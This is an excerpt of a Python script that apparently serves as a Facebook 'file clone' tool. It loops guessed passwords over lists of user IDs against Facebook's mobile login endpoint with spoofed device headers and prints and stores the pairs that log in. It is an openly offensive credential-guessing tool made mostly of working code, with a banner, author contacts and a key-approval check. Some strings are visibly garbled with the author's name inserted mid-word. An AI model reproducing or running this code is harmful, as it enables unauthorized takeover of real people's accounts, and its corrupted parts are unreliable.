...
from random import randint
r1=requests.get("https://github.com/UzzalVau/King-Uzzal-420/blob/main/Approval.txt").text
...
if not os.path.isfile('.agents.txt'):
	os.system('curl -L https://github.com/UzzalVau')
ct = datetime.now()
n = ct.month
...
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quUZZAL ty': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

def main():
	os.system('clear');print(banner)                                          
	print('\033[1;32m        ┌─────────────────────────────────┐') 
	print("\033[1;92m\t│\033[1;92mWELLCOME TO UZZAL-VAU     \033[1;92m      │")
	print('\033[1;32m┌────────────────────────────────────────────┐') 
...
class __crack__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mUZZAL \033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;36mTOTAL-Idz\033[1;37m] \033[1;37m[\033[1;36m{len(ok)}\033[1;37m]")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
			...
			po = ses.post("https://mbasic.facebook.com/login/device-based/vUZZAL date-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mUZZAL -OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
	...
	def __pler__(self):
		...
		if yan == '':
			...
			print('\033[1;37m[+]\033[1;33m File CLONING CP/OK IDS MIX ')
			print('\033[1;37m[+]\033[1;36m TOTAL IDS \033[1;91m: \033[1;32m%s ' % len(self.id))
			print('\033[1;37m[+]\033[1;36mUZZAL  PROCESS HAS BEEN STARTED')
			print(50*"\033[1;97m_")
			print('      \033[1;97m\033[1;41m [ IF  NO RESULT USE AIRPLANE MODE ] \033[0m\033[1;93m')
			print(50*"\033[1;97m_")
...
class __filecrack3__:
	...
	def __mbasic__(self, user, _sempak_):
		global ok,cp,loop
		sys.stdout.write(f"\r \x1b[1;97m[\033[1;36mUZZAL \033[1;37m] {loop}/{len(self.id)} \033[1;37m[\033[1;32mOK-{len(ok)}\033[1;37m] ")
		sys.stdout.flush()
		for pw in _sempak_:
			pw = pw.lower()
			try: os.mkdir('')
...
class load:
	def __init__(self):
		...
		print('\n')
banner = """   
db    db d88888D d88888D  .d8b.  db             db    db  .d8b.  db    db 
88    88 YP  d8' YP  d8' d8' `8b 88             88    88 d8' `8b 88    88 
88    88    d8'     d8'  88ooo88 88             Y8    8P 88ooo88 88    88 
88    88   d8'     d8'   88~~~88 88      C8888D `8b  d8' 88~~~88 88    88 
88b  d88  d8' db  d8' db 88   88 88booo.         `8bd8'  88   88 88b  d88 
~Y8888P' d88888P d88888P YP   YP Y88888P           YP    YP   YP ~Y8888P'                                                                                                                                                                                                                                                                                
=================================================
    [-] AUTHOR    :\033[1;32m MD UZZAL HOSSAIN 
    [-] GITHUB    :\033[1;32m Uzzalvau
    [-] WhatsApp  :\033[1;32m 01843438888
    [-] TOOLS     :\033[1;32m FILE CLONE
    [-] VERSION   :\033[1;32m 1.5
...
def xoshnaw():
	...
	try:
		httpCaht = requests.get("am start https://wa.me/+8801843438888?text='+tks").text
		if id in httpCaht:
